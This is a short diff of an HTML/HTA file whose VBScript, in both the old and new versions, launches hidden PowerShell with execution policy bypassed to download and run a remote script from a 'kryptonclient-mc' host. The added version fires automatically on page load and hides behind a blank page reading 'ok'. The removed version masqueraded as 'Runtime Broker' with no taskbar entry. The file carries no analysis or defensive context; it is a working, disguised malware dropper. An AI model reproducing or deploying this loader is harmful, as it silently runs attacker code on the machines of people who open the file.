@@ -1,14 +1,18 @@
 <html>
 <head>
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<HTA:APPLICATION ID="app" APPLICATIONNAME="Runtime Broker" BORDER="none" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
-</head>
-<body>
+<title>ok</title>
 <script language="VBScript">
-On Error Resume Next
-Set s = CreateObject("WScript.Shell")
-s.Run "powershell -nop -w hidden -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('https://kryptonclient-mc/stage2.ps1')""", 0, False
-window.close
+Sub Window_OnLoad
+  On Error Resume Next
+  Dim s, u
+  u = "https://kryptonclient-mc.vercel.app/payload.ps1"
+  s = "powershell -w hidden -nop -ep bypass -c ""iex (iwr -useb '" & u & "').Content"""
+  CreateObject("WScript.Shell").Run s, 0, False
+  window.close
+End Sub
 </script>
+</head>
+<body style="margin:0;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif;">
+<div style="font-size:72px;font-weight:bold;color:#000;">ok</div>
 </body>
 </html>
